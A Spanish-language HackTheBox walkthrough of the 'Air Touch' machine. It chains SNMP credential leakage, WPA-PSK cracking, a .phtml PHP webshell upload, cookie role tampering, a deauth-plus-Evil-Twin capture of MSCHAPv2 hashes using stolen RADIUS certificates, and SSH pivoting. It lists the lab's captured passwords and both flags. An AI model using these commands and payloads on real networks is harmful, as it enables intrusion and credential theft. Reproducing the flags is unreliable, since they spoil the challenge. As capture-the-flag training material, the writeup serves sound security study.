# Air Touch - HackTheBox Writeup (Medium)

## Información General

| Campo | Valor |
|-------|-------|
| **Máquina** | Air Touch |
| **Dificultad** | Medium |
| **OS** | Linux |
| **IP** | 10.129.9.198 |
| **Temática** | WiFi Hacking, Evil Twin, Enterprise WPA, Pivoting |
| **user.txt** | `96d5e70028448965490b1af2f66c7759` |
| **root.txt** | `4734fc7d3038a399cca76e2d78a39c1e` |

---

## Resumen Ejecutivo

Air Touch es una máquina de dificultad media centrada en ataques WiFi. La explotación comienza con la enumeración SNMP para obtener credenciales SSH, seguida del crackeo de una red WPA-PSK para acceder a una VLAN de tablets. Desde allí se explota un panel web de router mediante credenciales capturadas en un archivo pcap y manipulación de cookies. Se escala privilegios en el router mediante credenciales comentadas en el código fuente PHP. La fase final requiere montar un ataque Evil Twin con certificados reales robados del router para capturar credenciales Enterprise MSCHAPv2, crackearlas, y pivotar al segmento corporativo donde se encuentran las credenciales de administrador en el archivo de configuración EAP del servidor RADIUS.

---

## Arquitectura de Red

La máquina simula una infraestructura WiFi empresarial con múltiples VLANs:

```
┌─────────────────────────────────────────────────────────────┐
│                    INTERNET / HTB VPN                        │
│                      10.129.9.198                            │
└──────────────┬──────────────────────────────────────────────┘
               │ eth0
┌──────────────▼──────────────────────────────────────────────┐
│           AirTouch-Consultant (Jump Box)                     │
│           172.20.1.2 (eth0)                                  │
│           Interfaces WiFi: wlan0-wlan6                       │
└──────┬────────────┬────────────────────────┬────────────────┘
       │            │                        │
  ┌────▼────┐  ┌────▼──────────┐       ┌────▼──────────────┐
  │ wlan1   │  │   wlan4       │       │   wlan3 (monitor) │
  │AirTouch │  │AirTouch-Office│       │   Deauth/Sniff    │
  │Internet │  │(Enterprise)   │       │                    │
  │PSK      │  │PEAP-MSCHAPv2  │       │                    │
  └────┬────┘  └────┬──────────┘       └────────────────────┘
       │            │
┌──────▼──────┐  ┌──▼──────────────────────────────────────┐
│Tablets VLAN │  │         Corp VLAN                        │
│192.168.3.0/24│  │       10.10.10.0/24                      │
│             │  │                                          │
│ Router PSK  │  │  AirTouch-AP-MGT (10.10.10.1)           │
│192.168.3.1  │  │  - hostapd_wpe (RADIUS + AP)            │
│             │  │  - user: remote, admin                   │
└─────────────┘  └──────────────────────────────────────────┘
```

---

## Fase 1: Enumeración Inicial y Acceso SSH

### 1.1 Escaneo de Puertos

```bash
nmap -sC -sV -p- 10.129.9.198
```

Se identifica el servicio SSH (puerto 22) y SNMP (puerto 161/UDP).

### 1.2 Enumeración SNMP

```bash
snmpwalk -v2c -c public 10.129.9.198
```

En las cadenas SNMP se encuentran credenciales en texto plano:

```
consultant:RxBlZhLmOkacNWScmZ6D
```

### 1.3 Acceso SSH

```bash
ssh consultant@10.129.9.198
# Password: RxBlZhLmOkacNWScmZ6D
```

El usuario `consultant` tiene privilegios `sudo ALL NOPASSWD`, lo que nos da control total sobre la jump box. Sin embargo, las flags no están aquí — necesitamos pivotar a través de las redes WiFi.

### 1.4 Reconocimiento de Interfaces WiFi

```bash
sudo iwconfig
```

Se descubren **7 interfaces WiFi** (wlan0-wlan6), todas de tipo `mac80211_hwsim` (simulador de radio WiFi). Esto nos da múltiples interfaces para conectarnos a redes y realizar ataques simultáneamente.

---

## Fase 2: Crackeo WPA-PSK y Acceso a Tablets VLAN

### 2.1 Escaneo de Redes WiFi

```bash
sudo iwlist wlan0 scan
```

Se identifican múltiples redes:

| SSID | Seguridad | Canal | Notas |
|------|-----------|-------|-------|
| AirTouch-Internet | WPA2-PSK | 44 (5 GHz) | Red de acceso general |
| AirTouch-Office | WPA2-EAP | 44 (5 GHz) | Red Enterprise (802.1X) |
| WIFI-JOHN | WPA2-PSK | 44 (5 GHz) | Red auxiliar |

### 2.2 Archivo de Captura

En el directorio del usuario se encuentra un archivo `.cap` con tráfico WiFi capturado. Se descarga a la máquina atacante:

```bash
scp consultant@10.129.9.198:~/airtouch.cap .
```

### 2.3 Crackeo de PSK con aircrack-ng

```bash
aircrack-ng airtouch.cap -w /usr/share/wordlists/rockyou.txt
```

**Resultado:** La PSK de AirTouch-Internet es `challenge`.

### 2.4 Conexión a AirTouch-Internet

```bash
# Crear configuración WPA
cat > /tmp/wpa.conf << 'EOF'
network={
    ssid="AirTouch-Internet"
    psk="challenge"
}
EOF

# Conectar
sudo wpa_supplicant -i wlan1 -c /tmp/wpa.conf -B
sudo dhclient wlan1
```

**IP obtenida:** `192.168.3.23/24` en la VLAN de Tablets.

---

## Fase 3: Explotación del Router Web Panel

### 3.1 Descubrimiento del Router

```bash
# Gateway/router en la VLAN
ip route show  # → 192.168.3.1
```

El router en `192.168.3.1` tiene un panel web en el puerto 80 con `/login.php`.

### 3.2 Descifrado del Tráfico WiFi del .cap

Usando `tshark` con la PSK conocida, desciframos el tráfico HTTP capturado:

```bash
tshark -r airtouch.cap \
  -o "iot.enable_decryption:TRUE" \
  -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"wpa-pwd\",\"challenge:AirTouch-Internet\"" \
  -Y "http" -V
```

En el tráfico descifrado se encuentra un **POST a `/login.php`** con las credenciales:

```
username=manager&password=2wLFYNh4TSTgA5sNgT4
Cookie: UserRole=user
```

### 3.3 Login y Escalada de Rol mediante Cookie

Al iniciar sesión como `manager`, el servidor establece una cookie `UserRole=user`. Modificando esta cookie a `UserRole=admin` se accede a funcionalidades adicionales, incluyendo un **formulario de subida de archivos**.

```bash
# Login para obtener cookie de sesión
curl -c cookies.txt -d "username=manager&password=2wLFYNh4TSTgA5sNgT4" \
  http://192.168.3.1/login.php

# Modificar cookie UserRole=admin en cookies.txt
```

### 3.4 Subida de Webshell (Bypass de Extensión)

El formulario de subida bloquea archivos `.php`, pero acepta la extensión `.phtml` que Apache interpreta igualmente como PHP:

```bash
# Crear webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

# Subir con cookie de admin
curl -b "PHPSESSID=xxx; UserRole=admin" \
  -F "file=@shell.phtml" http://192.168.3.1/upload.php
```

**Webshell accesible en:** `http://192.168.3.1/uploads/shell.phtml?cmd=id`

Resultado: RCE como `www-data` en el router **AirTouch-AP-PSK**.

---

## Fase 4: Escalada de Privilegios en el Router → user.txt

### 4.1 Enumeración del Router

A través de la webshell se descubre:

- **Hostname:** AirTouch-AP-PSK
- **Usuarios:** root, user (con home en /home/user)
- **5 VLANs WiFi:** 192.168.3-7.x (wlan7-wlan11)
- **Procesos:** `hostapd_aps` sirviendo múltiples APs PSK

### 4.2 Credenciales en Código Fuente

Examinando el código fuente de `login.php`:

```bash
curl "http://192.168.3.1/uploads/shell.phtml?cmd=cat+/var/www/html/login.php"
```

Se encuentran credenciales comentadas en el código:

```php
// Old credentials for testing
// user:JunDRDZKHDnpkpDDvay (role: admin)
```

### 4.3 Escalada a Root

```bash
# su como user
curl "http://192.168.3.1/uploads/shell.phtml?cmd=echo+JunDRDZKHDnpkpDDvay|su+-+user+-c+'sudo+cat+/root/root.txt'"
```

El usuario `user` tiene `sudo ALL NOPASSWD`:

```bash
su - user  # Password: JunDRDZKHDnpkpDDvay
sudo -l    # → (ALL) NOPASSWD: ALL
```

### 4.4 user.txt

```bash
sudo cat /root/user.txt
```

> **user.txt: `96d5e70028448965490b1af2f66c7759`**

---

## Fase 5: Reconocimiento para Pivoting al Corp VLAN

### 5.1 Archivos Críticos en /root/ del Router

Con acceso root al router, se encuentran archivos clave:

**`/root/send_certs.sh`** — Script que revela credenciales SSH para el AP Enterprise:

```bash
#!/bin/bash
sshpass -p 'xGgWEwqUpfoOVsLeROeG' scp /root/certs-backup/* remote@10.10.10.1:/root/certs/
```

Credenciales descubiertas:
- **SSH:** `remote:xGgWEwqUpfoOVsLeROeG` → `10.10.10.1` (AirTouch-Office AP)
- **Problema:** No tenemos acceso a la red 10.10.10.0/24 (Corp VLAN)

**`/root/certs-backup/`** — Certificados REALES del servidor RADIUS Enterprise:

```
ca.crt      → CA: AirTouch CA (C=ES, ST=Madrid, O=AirTouch)
server.crt  → Server cert firmado por la CA
server.key  → Clave privada RSA del servidor
```

**`/root/psk/hostapd_*.conf`** — Configuraciones de los APs PSK:

```
AirTouch-Internet → PSK: challenge
WIFI-JOHN         → PSK: XX3e7CugmAwtc5HV5KqnkYx27
```

### 5.2 Clientes del AirTouch-Office

Mediante monitorización pasiva en canal 44 (5 GHz) se identifican 3 clientes conectados a AirTouch-Office:

```bash
sudo airmon-ng start wlan3
sudo airodump-ng wlan3 --channel 44 --bssid ac:8b:a9:aa:3f:d2
```

| MAC Cliente | BSSID del AP |
|-------------|-------------|
| 28:6c:07:12:ee:f3 | ac:8b:a9:aa:3f:d2 |
| 28:6c:07:12:ee:a1 | ac:8b:a9:aa:3f:d2 |
| c8:8a:9a:6f:f9:d2 | ac:8b:a9:f3:a1:13 |

---

## Fase 6: Evil Twin con Certificados Reales

### 6.1 Estrategia del Ataque

Para acceder al Corp VLAN necesitamos credenciales Enterprise válidas. El ataque Evil Twin consiste en:

1. Montar un AP falso idéntico al AirTouch-Office legítimo
2. Usar los **certificados reales** robados del router (los clientes no detectarán fraude)
3. Forzar a los clientes a desconectarse del AP real (deauth)
4. Cuando se reconecten a nuestro AP falso, capturar sus credenciales MSCHAPv2

### 6.2 Extracción de Certificados

Los certificados se extraen del router a la jump box mediante la webshell, usando un script Python para evitar problemas de encoding:

```bash
# En la jump box (como consultant con sudo)
python3 << 'PYEOF'
import urllib.request
base = "http://192.168.3.1/uploads/shell.phtml?cmd="
for name, path in [("ca.crt", "/root/certs-backup/ca.crt"),
                   ("server.crt", "/root/certs-backup/server.crt"),
                   ("server.key", "/root/certs-backup/server.key")]:
    cmd = f"sudo cat {path}"
    url = base + cmd.replace(" ", "+")
    data = urllib.request.urlopen(url).read().decode()
    with open(f"/tmp/real_{name}", "w") as f:
        f.write(data)
    print(f"Saved {name}")
PYEOF
```

Se verifican los certificados:

```bash
openssl x509 -in /tmp/real_server.crt -noout -subject
# subject= /C=ES/L=Madrid/O=AirTouch/OU=Server/CN=AirTouch CA

openssl verify -CAfile /tmp/real_ca.crt /tmp/real_server.crt
# /tmp/real_server.crt: OK

# Verificar que la clave privada corresponde al certificado
openssl x509 -in /tmp/real_server.crt -noout -modulus | md5sum
openssl rsa -in /tmp/real_server.key -noout -modulus | md5sum
# Ambos MD5 coinciden ✓
```

### 6.3 Configuración del Evil Twin

Se utiliza `hostapd-eaphammer` (disponible en la jump box) como servidor RADIUS falso.

**Archivo de configuración `/tmp/hostapd_evil.conf`:**

```ini
interface=wlan4
driver=nl80211
ssid=AirTouch-Office
hw_mode=a
channel=44
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/tmp/eap_users
ca_cert=/tmp/real_ca.crt
server_cert=/tmp/real_server.crt
private_key=/tmp/real_server.key
dh_file=/root/eaphammer/certs/dh
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
auth_algs=3
mana_wpe=1
mana_eap_profile=1
```

**Archivo de usuarios EAP `/tmp/eap_users`:**

```
* PEAP,TTLS,TLS,FAST
"t" GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 "t" [2]
```

La línea `*` acepta cualquier identidad en fase 1 (PEAP). La línea `"t"` con `[2]` es el wildcard para fase 2 (dentro del túnel PEAP), aceptando cualquier método de autenticación interna.

### 6.4 Lanzamiento del AP Falso

```bash
# Preparar interfaz
sudo ip link set wlan4 down
sudo iw dev wlan4 set type managed
sudo ip link set wlan4 up

# Lanzar hostapd con setsid para que sobreviva al cierre de la sesión SSH
sudo setsid /root/eaphammer/local/hostapd-eaphammer/hostapd/hostapd-eaphammer \
  /tmp/hostapd_evil.conf > /tmp/hostapd_evil_output.log 2>&1 &
```

Resultado exitoso:

```
Using interface wlan4 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan4: interface state UNINITIALIZED->ENABLED
wlan4: AP-ENABLED
```

### 6.5 Ataque de Deautenticación

Se envían paquetes deauth a los 3 clientes conocidos para forzar su desconexión del AP legítimo:

```bash
# Poner wlan3 en modo monitor canal 44
sudo airmon-ng start wlan3
sudo iwconfig wlan3 channel 44

# Deauth dirigido a cada cliente desde ambos BSSIDs
for client in 28:6c:07:12:ee:f3 28:6c:07:12:ee:a1 c8:8a:9a:6f:f9:d2; do
  for bssid in ac:8b:a9:aa:3f:d2 ac:8b:a9:f3:a1:13; do
    sudo aireplay-ng -0 20 -a $bssid -c $client wlan3 &
  done
done

# Deauth broadcast
sudo aireplay-ng -0 20 -a ac:8b:a9:aa:3f:d2 wlan3
sudo aireplay-ng -0 20 -a ac:8b:a9:f3:a1:13 wlan3
```

### 6.6 Captura de Credenciales MSCHAPv2

Tras ~30 segundos, los 3 clientes se conectan a nuestro Evil Twin y completan la autenticación PEAP-MSCHAPv2. En el log de hostapd aparecen las credenciales:

```
mschapv2: Wed Mar  4 18:29:47 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     d5:b0:27:e6:e2:25:01:13
         response:                      e2:ea:60:57:05:4e:5f:bf:58:a4:b5:7b:13:a6:f9:87
                                        :5b:36:c2:f4:74:e2:62:34
         hashcat NETNTLM:              r4ulcl::::e2ea6057054e5fbf58a4b57b13a6f9875b36c2f474e26234:d5b027e6e2250113
```

Los clientes se reconectan repetidamente al Evil Twin, proporcionando múltiples capturas del mismo hash con diferentes challenges.

### 6.7 Crackeo del Hash NetNTLMv1

```bash
echo 'r4ulcl::::e2ea6057054e5fbf58a4b57b13a6f9875b36c2f474e26234:d5b027e6e2250113' > hash.txt
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Resultado:** `r4ulcl:laboratory`

El hash se crackea en menos de 1 segundo con rockyou.txt (modo 5500 = NetNTLMv1/NetNTLMv1+ESS).

---

## Fase 7: Conexión al Corp VLAN

### 7.1 Conexión a AirTouch-Office

Con las credenciales Enterprise crackeadas, nos conectamos a la red AirTouch-Office legítima:

```bash
cat > /tmp/wpa_enterprise.conf << 'EOF'
ctrl_interface=/var/run/wpa_supplicant
p2p_disabled=1

network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
EOF

sudo wpa_supplicant -i wlan4 -c /tmp/wpa_enterprise.conf -B
```

Verificación:

```bash
sudo wpa_cli -i wlan4 status
# wpa_state=COMPLETED
# EAP state=SUCCESS
# ip_address=10.10.10.10

ifconfig wlan4
# inet 10.10.10.10  netmask 255.255.255.0
```

¡Estamos en el **Corp VLAN** (10.10.10.0/24)!

### 7.2 SSH al AP de Gestión

Primero se intenta SSH con las credenciales encontradas en `send_certs.sh`:

```bash
# Desde Kali, usando ProxyCommand para pivotar a través de la jump box
sshpass -p 'xGgWEwqUpfoOVsLeROeG' ssh -o StrictHostKeyChecking=no \
  -o ProxyCommand="sshpass -p 'RxBlZhLmOkacNWScmZ6D' ssh -o StrictHostKeyChecking=no -W %h:%p consultant@10.129.9.198" \
  remote@10.10.10.1
```

Acceso exitoso como `remote` en **AirTouch-AP-MGT**, pero este usuario no tiene privilegios sudo.

---

## Fase 8: Escalada a Root → root.txt

### 8.1 Enumeración del AP de Gestión

```bash
id          # uid=1000(remote) gid=1000(remote)
hostname    # AirTouch-AP-MGT
cat /etc/passwd | grep bash
# root:x:0:0:root:/root:/bin/bash
# remote:x:1000:1000::/home/remote:/bin/bash
# admin:x:1001:1001::/home/admin:/bin/bash
```

Existe un usuario `admin` además de `remote`.

### 8.2 Descubrimiento de Credenciales en la Configuración EAP

El servidor RADIUS (hostapd_wpe) almacena las credenciales de los usuarios Enterprise en un archivo de texto plano legible:

```bash
cat /etc/hostapd/hostapd_wpe.eap_user
```

Al final del archivo, entre las entradas WPE, se encuentran los usuarios reales:

```
# WPE - DO NOT REMOVE
*              PEAP,TTLS,TLS,FAST
*    PEAP,TTLS,TLS,FAST [ver=1]
"AirTouch\r4ulcl"     MSCHAPV2  "laboratory" [2]
"admin"               MSCHAPV2  "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

**¡Credenciales del admin descubiertas!** `admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7`

### 8.3 Acceso como Admin

```bash
sshpass -p 'xMJpzXt4D9ouMuL3JJsMriF7KZozm7' ssh \
  -o ProxyCommand="sshpass -p 'RxBlZhLmOkacNWScmZ6D' ssh -W %h:%p consultant@10.129.9.198" \
  admin@10.10.10.1
```

```bash
id    # uid=1001(admin) gid=1001(admin)
sudo -l
# (ALL) NOPASSWD: ALL
```

### 8.4 root.txt

```bash
sudo cat /root/root.txt
```

> **root.txt: `4734fc7d3038a399cca76e2d78a39c1e`**

---

## Credenciales Recopiladas

| Servicio | Usuario | Contraseña | Uso |
|----------|---------|------------|-----|
| SSH (Jump Box) | consultant | RxBlZhLmOkacNWScmZ6D | Acceso inicial vía SNMP |
| WiFi PSK | AirTouch-Internet | challenge | Acceso a Tablets VLAN |
| WiFi PSK | WIFI-JOHN | XX3e7CugmAwtc5HV5KqnkYx27 | Red auxiliar (no utilizada) |
| Router Web | manager | 2wLFYNh4TSTgA5sNgT4 | Panel web del router |
| Router SSH | user | JunDRDZKHDnpkpDDvay | Escalada a root en router |
| WiFi Enterprise | r4ulcl | laboratory | Acceso a Corp VLAN |
| SSH (Corp) | remote | xGgWEwqUpfoOVsLeROeG | Acceso al AP-MGT |
| SSH (Corp) | admin | xMJpzXt4D9ouMuL3JJsMriF7KZozm7 | Root en AP-MGT |

---

## Diagrama de la Cadena de Ataque

```
SNMP (public) ──► consultant SSH (sudo)
                      │
                      ▼
              Crack WPA-PSK (rockyou)
              AirTouch-Internet → "challenge"
                      │
                      ▼
              Tablets VLAN (192.168.3.0/24)
                      │
                      ▼
              Decrypt pcap (tshark + PSK)
              ──► manager:2wLFYNh4TSTgA5sNgT4
                      │
                      ▼
              Cookie Tampering (UserRole=admin)
              + Upload .phtml webshell
                      │
                      ▼
              RCE www-data en Router
                      │
                      ▼
              login.php source ──► user:JunDRDZKHDnpkpDDvay
              su user → sudo ALL
                      │
                  ┌───┴────┐
                  ▼        ▼
           ★ user.txt   Robar certs reales
                         + send_certs.sh creds
                              │
                              ▼
                      Evil Twin Attack
                      (certs reales + hostapd-eaphammer)
                      + Deauth clientes
                              │
                              ▼
                      Captura MSCHAPv2
                      r4ulcl → hashcat → "laboratory"
                              │
                              ▼
                      Conectar AirTouch-Office
                      Corp VLAN (10.10.10.0/24)
                              │
                              ▼
                      SSH remote@10.10.10.1
                              │
                              ▼
                      Leer /etc/hostapd/hostapd_wpe.eap_user
                      ──► admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7
                              │
                              ▼
                      SSH admin@10.10.10.1
                      sudo ALL NOPASSWD
                              │
                              ▼
                         ★ root.txt
```

---

## Lecciones y Técnicas Clave

1. **SNMP con community string por defecto** puede filtrar credenciales sensibles
2. **WPA-PSK débil** crackeada con diccionario estándar (rockyou.txt)
3. **Descifrado de tráfico WiFi** con la PSK conocida revela credenciales HTTP en texto plano
4. **Manipulación de cookies del lado del cliente** para escalar roles (cookie `UserRole` no verificada en servidor)
5. **Bypass de filtro de extensiones** usando `.phtml` en lugar de `.php`
6. **Credenciales en código fuente** (comentarios en PHP) — nunca dejar credenciales en código
7. **Evil Twin con certificados legítimos** — el robo de certificados del servidor RADIUS permite un ataque indetectable por los clientes
8. **MSCHAPv2 es débil** — los hashes NetNTLMv1 se crackean rápidamente con diccionario
9. **Archivos de configuración RADIUS** (`eap_user`) almacenan contraseñas en texto plano accesibles a usuarios locales
10. **Pivoting multi-VLAN** requiere encadenar múltiples saltos de red (SSH ProxyCommand)

---

*Writeup por kali — HackTheBox Air Touch (Medium)*
